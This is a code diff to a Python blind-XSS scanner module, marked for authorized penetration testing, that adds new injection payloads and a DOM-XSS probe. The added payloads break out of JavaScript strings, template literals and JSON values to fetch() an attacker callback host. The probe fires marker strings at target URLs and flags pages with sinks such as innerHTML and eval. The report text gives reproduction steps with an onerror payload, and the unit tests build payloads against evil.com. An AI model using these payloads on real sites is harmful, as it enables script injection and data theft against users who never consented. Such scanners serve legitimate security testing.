@@ -20,7 +20,6 @@ FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
 from __future__ import annotations
 
 import asyncio
-import hashlib
 import logging
 import sys
 import time
@@ -114,6 +113,36 @@ def _build_blind_xss_payloads(
         (
             f"![x](https://{token}.{callback_url}/bxss?md=1)",
             "markdown-img",
+        ),
+
+        # ── Tier 8: JS string breakout (closes JS string literal) ─
+        (
+            f"'-fetch('//{token}.{callback_url}/bxss?js=1')-'",
+            "js-string-squote",
+        ),
+        (
+            f'"-fetch("//{token}.{callback_url}/bxss?js=2")-"',
+            "js-string-dquote",
+        ),
+        (
+            f"\\'-fetch('//{token}.{callback_url}/bxss?js=3')//'",
+            "js-string-escaped-squote",
+        ),
+
+        # ── Tier 9: Template literal injection `${...}` ──────────
+        (
+            f"${{fetch('//{token}.{callback_url}/bxss?tpl=1')}}",
+            "template-literal",
+        ),
+        (
+            f"`${{fetch('//{token}.{callback_url}/bxss?tpl=2')}}`",
+            "template-literal-backtick",
+        ),
+
+        # ── Tier 10: JSON context (value injection) ───────────────
+        (
+            f'","xss":"//{token}.{callback_url}/bxss?json=1","x":"',
+            "json-value-inject",
         ),
     ]
 
@@ -212,6 +241,11 @@ class BlindXss(BaseModule):
 
         # ── Phase 4: Inject via JSON API ─────────────────────────
         json_count = await self._inject_json_api(target, payloads)
+
+        # ── Phase 5: DOM-based XSS sink probe (no OOB needed) ────
+        dom_suspects = await self._dom_xss_probe(target)
+        if dom_suspects:
+            self._report_dom_suspects(target, dom_suspects)
 
         total = form_count + param_count + post_count + json_count
         self.log.info(
@@ -403,6 +437,99 @@ class BlindXss(BaseModule):
 
         return count
 
+    async def _dom_xss_probe(self, target: str) -> list[dict]:
+        """Probe for DOM-based XSS sinks by injecting into hash/search params.
+
+        DOM XSS fires client-side via JavaScript sinks:
+            document.write, innerHTML, eval, location.hash, location.search.
+        We inject a unique marker into hash (#) and search (?x=) params, retrieve
+        the response HTML, and look for unescaped reflection of our marker
+        in script blocks or event attributes — a strong indicator that the
+        JS sink will execute it without sanitization.
+
+        Returns list of {url, label, sink_hint} dicts for each suspect.
+        """
+        suspects: list[dict] = []
+        marker = "FRGExss1337"
+
+        parsed = urlparse(target)
+        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+        probe_urls = [
+            # Hash-based sink probes (location.hash → innerHTML)
+            (f"{base_url}?{marker}=1#{marker}", "hash-fragment"),
+            (f"{base_url}#{marker}", "bare-hash"),
+            # Search param sinks (location.search → document.write)
+            (f"{base_url}?q={marker}", "search-param-q"),
+            (f"{base_url}?search={marker}", "search-param-search"),
+            (f"{base_url}?redirect={marker}", "search-param-redirect"),
+            (f"{base_url}?url={marker}", "search-param-url"),
+            (f"{base_url}?next={marker}", "search-param-next"),
+            (f"{base_url}?returnTo={marker}", "search-param-returnTo"),
+            (f"{base_url}?callback={marker}", "jsonp-callback"),
+            (f"{base_url}?jsonp={marker}", "jsonp-param"),
+        ]
+
+        # DOM sink patterns that indicate unsafe JS use of the parameter
+        import re
+        sink_patterns = [
+            re.compile(r"document\.write\s*\(", re.I),
+            re.compile(r"\.innerHTML\s*=", re.I),
+            re.compile(r"\.outerHTML\s*=", re.I),
+            re.compile(r"eval\s*\(", re.I),
+            re.compile(r"setTimeout\s*\(\s*['\"]", re.I),
+            re.compile(r"setInterval\s*\(\s*['\"]", re.I),
+            re.compile(r"location\s*=\s*[^=]", re.I),
+            re.compile(r"location\.href\s*=", re.I),
+        ]
+
+        try:
+            import aiohttp
+            for probe_url, label in probe_urls:
+                await self.rate_limit()
+                try:
+                    async with aiohttp.ClientSession(
+                        connector=aiohttp.TCPConnector(ssl=False)
+                    ) as session:
+                        async with session.get(
+                            probe_url, timeout=aiohttp.ClientTimeout(total=8),
+                        ) as resp:
+                            body = await resp.text(errors="replace")
+
+                    # Check 1: raw marker reflected in response (unescaped)
+                    if marker in body:
+                        sink_hint = "marker-reflected-raw"
+                        # Check 2: is it reflected inside a script block or handler?
+                        in_script = bool(re.search(
+                            rf"<script[^>]*>[^<]*{re.escape(marker)}",
+                            body, re.I | re.S,
+                        ))
+                        if in_script:
+                            sink_hint = "marker-in-script-block"
+                        suspects.append({
+                            "url": probe_url,
+                            "label": label,
+                            "sink_hint": sink_hint,
+                        })
+                        continue
+
+                    # Check 3: page contains dangerous sink patterns near parameter context
+                    for pat in sink_patterns:
+                        if pat.search(body):
+                            suspects.append({
+                                "url": probe_url,
+                                "label": label,
+                                "sink_hint": f"sink-pattern:{pat.pattern[:30]}",
+                            })
+                            break
+
+                except Exception:
+                    pass
+        except ImportError:
+            pass
+
+        return suspects
+
     # ══════════════════════════════════════════════════════════════
     # REPORTING
     # ══════════════════════════════════════════════════════════════
@@ -503,6 +630,60 @@ class BlindXss(BaseModule):
             target=target,
         )
 
+    def _report_dom_suspects(
+        self, target: str, suspects: list[dict]
+    ) -> None:
+        """Report DOM-based XSS sink indicators found during probe."""
+        details = "\n".join(
+            f"  [{s['label']}] {s['url']} — sink: {s['sink_hint']}"
+            for s in suspects
+        )
+        ev = Evidence(
+            request_raw=f"DOM XSS probe — {len(suspects)} suspect sinks identified",
+            response_raw=details,
+            extra={
+                "suspects": suspects,
+                "detection": "dom-based",
+                "confidence": "MEDIUM",
+            },
+        )
+
+        self.new_finding(
+            title=f"DOM-Based XSS Sink Indicators — {len(suspects)} Location(s)",
+            severity=Severity.HIGH,
+            description=(
+                f"DOM-based XSS sink patterns were detected at {target}. "
+                "The server reflects attacker-controlled input (URL parameters, "
+                "hash fragments) into the HTML response without encoding, or the "
+                "page contains JavaScript sinks (innerHTML, document.write, eval) "
+                "that may process URL-derived data without sanitization. "
+                "DOM XSS executes entirely client-side — traditional scanners "
+                "that only inspect server responses will miss it entirely.\n\n"
+                f"Suspect locations:\n{details}"
+            ),
+            reproduction_steps=[
+                "1. Open the target URL with a marker in the hash/search param",
+                "2. Observe unescaped marker reflected in page source or script block",
+                "3. Replace marker with XSS payload: <img src=x onerror=alert(1)>",
+                "4. Use browser DevTools Sources panel to confirm sink execution",
+            ],
+            remediation=(
+                "1. Never pass location.hash / location.search to innerHTML, "
+                "document.write, or eval without sanitization\n"
+                "2. Use textContent instead of innerHTML for text insertion\n"
+                "3. Implement strict CSP: script-src 'self' 'nonce-...' — "
+                "blocks inline eval and injected scripts\n"
+                "4. Adopt DOMPurify for any HTML rendering from untrusted sources\n"
+                "5. Review all JSONP endpoints — they are a common DOM XSS vector"
+            ),
+            references=["CWE-79", "OWASP A03:2021"],
+            evidence=ev,
+            cvss_v31_vector=CVSS_STORED_XSS,
+            cvss_v40_vector=CVSS40_STORED_XSS,
+            mitre_attack=["TA0004/T1059.007"],
+            target=target,
+        )
+
 
 # ══════════════════════════════════════════════════════════════════════
 # UNIT TESTS
@@ -522,6 +703,41 @@ class TestBlindXss:
         payloads = _build_blind_xss_payloads("evil.com", "tok")
         script_payloads = [p for p, l in payloads if "script-src" in l]
         assert len(script_payloads) >= 2
+
+    def test_js_string_context_payloads(self) -> None:
+        payloads = _build_blind_xss_payloads("evil.com", "tok")
+        labels = {l for _, l in payloads}
+        assert any("js-string" in l for l in labels), "JS string breakout payloads missing"
+
+    def test_template_literal_payloads(self) -> None:
+        payloads = _build_blind_xss_payloads("evil.com", "tok")
+        labels = {l for _, l in payloads}
+        assert any("template-literal" in l for l in labels), "Template literal payloads missing"
+
+    def test_context_coverage(self) -> None:
+        """Verify all required XSS context types are represented."""
+        payloads = _build_blind_xss_payloads("evil.com", "tok")
+        labels = {l for _, l in payloads}
+        # HTML context
+        assert any("script-src" in l or "img-onerror" in l for l in labels), "HTML context missing"
+        # Attribute context
+        assert any("onfocus" in l or "ontoggle" in l for l in labels), "Attribute context missing"
+        # SVG context
+        assert any("svg" in l for l in labels), "SVG context missing"
+        # JS string context
+        assert any("js-string" in l for l in labels), "JS string context missing"
+        # Template literal
+        assert any("template-literal" in l for l in labels), "Template literal context missing"
+        # JSON context
+        assert any("json" in l for l in labels), "JSON context missing"
+
+    def test_dom_xss_probe_returns_list(self) -> None:
+        """_dom_xss_probe signature: no payloads param, returns list."""
+        import inspect
+        sig = inspect.signature(BlindXss._dom_xss_probe)
+        params = list(sig.parameters.keys())
+        assert "payloads" not in params, "_dom_xss_probe should not take payloads arg"
+        assert "target" in params
 
     def test_blind_xss_fields_not_empty(self) -> None:
         assert len(BLIND_XSS_FIELDS) >= 15
